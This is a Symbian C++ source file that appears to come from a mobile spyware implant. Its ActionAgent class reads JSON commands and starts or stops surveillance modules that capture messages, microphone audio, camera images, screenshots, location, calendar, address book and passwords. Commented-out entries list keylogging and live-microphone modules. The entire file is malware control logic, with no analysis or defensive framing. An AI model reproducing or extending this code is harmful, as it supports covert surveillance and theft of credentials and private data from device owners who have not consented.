/*
 * ActionAgent.cpp
 *
 *  Created on: 09/feb/2012
 *      Author: Giovanna
 */

#include "ActionAgent.h"

#include "Json.h"

CActionAgent::CActionAgent(TQueueType aQueueType) :
	CAbstractAction(EAction_Agent, aQueueType)
	{
	// No implementation required
	}

CActionAgent::~CActionAgent()
	{
	}

CActionAgent* CActionAgent::NewLC(const TDesC8& params, TQueueType aQueueType)
	{
	CActionAgent* self = new (ELeave) CActionAgent(aQueueType);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CActionAgent* CActionAgent::NewL(const TDesC8& params, TQueueType aQueueType)
	{
	CActionAgent* self = CActionAgent::NewLC(params, aQueueType);
	CleanupStack::Pop(); // self;
	return self;
	}

void CActionAgent::ConstructL(const TDesC8& params)
	{
		BaseConstructL(params);
		
		//parse params
		
		RBuf paramsBuf;
			
		TInt err = paramsBuf.Create(2*params.Size());
		if(err == KErrNone)
			{
			paramsBuf.Copy(params);
			}
		else
			{
			//TODO: not enough memory
			}
		TBuf<8> status;  // "start" or "Stop"
		TBuf<32> module;
		paramsBuf.CleanupClosePushL();
		CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
		CleanupStack::PushL(jsonBuilder);
		jsonBuilder->BuildFromJsonStringL(paramsBuf);
		CJsonObject* rootObject;
		jsonBuilder->GetDocumentObject(rootObject);
		if(rootObject)
			{
			CleanupStack::PushL(rootObject);
			//retrieve status: start or stop
			rootObject->GetStringL(_L("status"),status);
			//retrieve module name
			rootObject->GetStringL(_L("module"),module);
			CleanupStack::PopAndDestroy(rootObject);
			}

		CleanupStack::PopAndDestroy(jsonBuilder);
		CleanupStack::PopAndDestroy(&paramsBuf);
		
		if(status.Compare(_L("start")) == 0)
			iCommand = EAgentStart;
		else if(status.Compare(_L("stop")) == 0)
			iCommand = EAgentStop;
			
		iModuleId = GetModuleId(module);
	}

void CActionAgent::DispatchStartCommandL()
	{
	TInt value=0;
	if(iConditioned)
		{
		// we are conditioned by a previous sync, we get the result
		RProperty::Get(KPropertyUidCore, KPropertyStopSubactions,value);
		}
	if(value == 0)
		{
		// we have to execute
		switch(iCommand)
			{
			case EAgentStart:
				{
				iCore->StartAgentL((TAgentType)iModuleId);
				}
				break;
			case EAgentStop:
				{
				iCore->StopAgentL((TAgentType)iModuleId);
				}
				break;
			default:
				break;
			}
		}
	MarkCommandAsDispatchedL();
	SetFinishedJob(ETrue);
	}

TInt CActionAgent::GetModuleId(const TDesC& aModuleName)
	{
	
	if(aModuleName.Compare(_L("messages")) == 0)
		return EAgent_Messages;
	if(aModuleName.Compare(_L("mic")) == 0)
		return EAgent_Mic;
	if(aModuleName.Compare(_L("device")) == 0)
		return EAgent_Device;
	if(aModuleName.Compare(_L("application"))==0)
		return EAgent_Application;
	if(aModuleName.Compare(_L("call")) == 0)
		return EAgent_Call_TODO;
	if(aModuleName.Compare(_L("camera"))==0)
		return EAgent_Cam;
	if(aModuleName.Compare(_L("screenshot")) == 0)
		return EAgent_Screenshot;
	if(aModuleName.Compare(_L("position")) == 0)
		return EAgent_Position;
	if(aModuleName.Compare(_L("calendar")) == 0)
		return EAgent_Calendar;
	if(aModuleName.Compare(_L("addressbook")) == 0)
		return EAgent_Addressbook;
	if(aModuleName.Compare(_L("password")) == 0)
		return EAgent_Password;
	/*
	if(aModuleName.Compare(_L("chat"))==0)
		return 0;
	if(aModuleName.Compare(_L("url"))== 0)
		return 0;
	if(aModuleName.Compare(_L("clipboard")) == 0)
		return 0;
	if(aModuleName.Compare(_L("conference")) == 0)
		return 0;
	if(aModuleName.Compare(_L("crisis")) == 0)
		return 0;
	if(aModuleName.Compare(_L("keylog")) == 0)
		return 0;
	if(aModuleName.Compare(_L("livemic")) == 0)
		return 0;
	*/
	return 0;
	}

void CActionAgent::SetCorePointer(CCore* aCore)
	{
	iCore = aCore;
	}
